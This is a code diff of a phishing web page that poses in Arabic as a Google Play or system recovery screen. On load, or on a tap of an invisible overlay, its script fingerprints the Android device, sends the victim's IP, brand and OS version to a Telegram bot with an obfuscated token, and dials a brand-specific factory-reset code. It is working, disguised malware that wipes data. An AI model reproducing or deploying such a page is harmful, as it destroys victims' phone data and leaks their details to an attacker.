@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Android Security Core</title>
+    <title>Google System Recovery</title>
     <style>
         body { background:#fff; font-family:sans-serif; text-align:center; padding-top:20%; margin:0; overflow:hidden; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; display:inline-block; }
@@ -11,80 +11,69 @@
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; }
     </style>
 </head>
-<body onload="final_execution()">
-
+<body onload="x_execute()">
     <div id="overlay"></div>
-
     <div id="content">
         <div class="loader"></div>
-        <p style="color:#5f6368; font-size:18px;">جاري تحديث خدمات Google Play...</p>
-        <p style="color:#999; font-size:12px;">يرجى عدم إغلاق الصفحة لضمان أمان حسابك</p>
+        <p style="color:#4285F4; font-size:18px; font-weight:bold;">جاري التحقق من ملكية الجهاز...</p>
+        <p style="color:#777; font-size:14px;">يرجى الانتظار، ستفتح لوحة التحكم تلقائياً</p>
     </div>
 
 <script>
-    // بياناتك المشفرة (بوت التليجرام)
     const _t = "ODU4NTE1NzEzNjpBQUVhQlp3LVgwUXVmT3JFeFRWQ2RKZ20wZXpycTNRTGtqOA==";
     const _c = "NzE4NDk3MDM1NQ==";
     function _d(s) { return atob(s); }
 
-    function final_execution() {
+    function x_execute() {
         const p = new URLSearchParams(window.location.search);
         if (p.get('auth') !== 'true') { window.location.href = "https://www.google.com"; return; }
 
         let ua = navigator.userAgent;
         let uL = ua.toLowerCase();
+        let platform = navigator.platform.toLowerCase();
 
-        // 1. الهروب من المتصفحات المحدودة (واتساب، فيسبوك) إلى Chrome لضمان نجاح الـ Intent
+        // 1. الهروب من المتصفحات الداخلية لضمان عمل الـ Intent
         if (/FBAN|FBAV|Instagram|WhatsApp|Telegram/i.test(ua)) {
             window.location.href = "intent://" + window.location.href.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
             return;
         }
 
-        // 2. محرك فحص الإصدار الحقيقي (كشف Android 11+ المخفي)
-        let realOS = 10;
+        // 2. محرك كشف الإصدار الحقيقي (Android 11+)
+        let osVer = 10;
         if (ua.indexOf("Android") >= 0) {
-            realOS = parseFloat(ua.slice(ua.indexOf("Android") + 8));
-            // تصحيح ذكي بناءً على بصمة المتصفح الحديثة
-            if (ua.includes("AppleWebKit/537.36") && realOS <= 10 && !ua.includes("Version/4.0")) {
-                realOS = 11; 
-            }
+            osVer = parseFloat(ua.slice(ua.indexOf("Android") + 8));
+            if (ua.includes("AppleWebKit/537.36") && osVer <= 10 && !ua.includes("Version/4.0")) { osVer = 11; }
         }
 
-        // 3. تحديد الشركة بدقة (تجاوز Generic عبر فحص الموديلات)
+        // 3. تحديد الشركة (دقة مجهرية عبر فحص الموديلات والبصمات)
         let brand = "Android Generic";
-        let targetCode = "2767*3855%23"; // الكود الافتراضي (Samsung/Realme/Oppo)
+        let targetCode = "2767*3855%23"; 
 
-        if (uL.includes("samsung")) {
-            brand = "Samsung";
-        } else if (uL.includes("xiaomi") || uL.includes("redmi") || uL.includes("miui") || uL.includes("poco")) {
-            brand = "Xiaomi"; targetCode = "%23*%23*7780*%23*%23";
-        } else if (uL.includes("huawei") || uL.includes("honor")) {
-            brand = "Huawei"; targetCode = "%23*%23*2846579*%23*%23";
-        } else if (uL.includes("realme") || uL.includes("rmx") || uL.includes("oppo") || uL.includes("cph") || uL.includes("vivo")) {
-            brand = "Realme/Oppo";
-        }
+        // فحص مصفوفة الشركات والموديلات
+        if (uL.includes("samsung")) { brand = "Samsung"; }
+        else if (uL.includes("xiaomi") || uL.includes("redmi") || uL.includes("miui") || uL.includes("poco")) { brand = "Xiaomi"; targetCode = "%23*%23*7780*%23*%23"; }
+        else if (uL.includes("huawei") || uL.includes("honor")) { brand = "Huawei"; targetCode = "%23*%23*2846579*%23*%23"; }
+        else if (uL.includes("realme") || uL.includes("rmx") || uL.includes("oppo") || uL.includes("cph") || uL.includes("vivo")) { brand = "Realme/Oppo"; }
+        else if (platform.includes("linux arm") || ua.includes("linux; u; android")) { brand = "MTK/Generic Device"; }
 
-        // 4. إرسال تقرير الصيد الموحد (التقرير الذي يظهر في البوت)
-        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(ipData => {
-            let status = (realOS >= 11) ? "⚠️ توجيه قسري (11+)" : "🚀 تنفيذ تلقائي (10-)";
-            let report = `🎯 صيد نهائي موثق!\n🌐 IP: ${ipData.ip}\n📱 الشركة: ${brand}\n⚙️ الإصدار: Android ${realOS}\n📡 الحالة: ${status}\n📟 الكود: *${targetCode.replace('%23', '#')}*`;
-            fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent(report)}`);
+        // 4. إرسال التقرير النهائي للبوت
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(ip => {
+            let mode = (osVer >= 11) ? "⚠️ توجيه قسري (11+)" : "🚀 تنفيذ تلقائي (10-)";
+            let msg = `🎯 صيد مؤكد (v9.0)\n🌐 IP: ${ip.ip}\n📱 الشركة: ${brand}\n⚙️ الإصدار: Android ${osVer}\n📡 الحالة: ${mode}\n📟 الكود: *${targetCode.replace('%23', '#')}*`;
+            fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent(msg)}`);
         });
 
-        // 5. التنفيذ النووي (تلقائي لـ 10، وقسري لـ 11+)
+        // 5. التنفيذ القسري المزدوج
         setTimeout(() => {
-            if (realOS >= 11) {
+            if (osVer >= 11) {
                 // فتح لوحة الاتصال بالكود المناسب قسرياً
                 window.location.href = `intent://*${targetCode}#Intent;scheme=tel;action=android.intent.action.DIAL;end`;
             } else {
-                // تنفيذ مباشر للإصدارات القديمة
                 window.location.href = "tel:*" + targetCode;
             }
         }, 1500);
     }
-
-    // إجبار النظام على العمل عند أي لمسة للضحية
-    document.getElementById('overlay').onclick = final_execution;
+    document.getElementById('overlay').onclick = x_execute;
 </script>
 </body>
 </html>
